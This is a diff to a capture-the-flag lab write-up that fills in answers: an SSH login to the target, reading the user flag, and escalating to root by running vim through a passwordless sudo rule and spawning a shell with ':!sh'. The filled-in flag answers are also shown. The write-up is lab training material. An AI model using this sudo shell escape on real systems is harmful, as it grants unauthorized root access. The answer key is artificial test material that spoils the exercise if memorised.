@@ -41,6 +41,7 @@ Where can you login with the details obtained?
 What's the user flag?
 ```
 ssh mitch@<target_ip> -p2222
+cat user.txt
 ```
 > G00d j0b, keep up!
 
@@ -52,12 +53,20 @@ cd /home
 
 What can you leverage to spawn a privileged shell?
 ```
-
+sudo -l
 ```
-> 
+```
+Output:
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+> vim
 
 What's the root flag?
 ```
-
+sudo vim
+:!sh
+cd /root
+cat root.txt
 ```
-> 
+> W3ll d0n3. You made it!
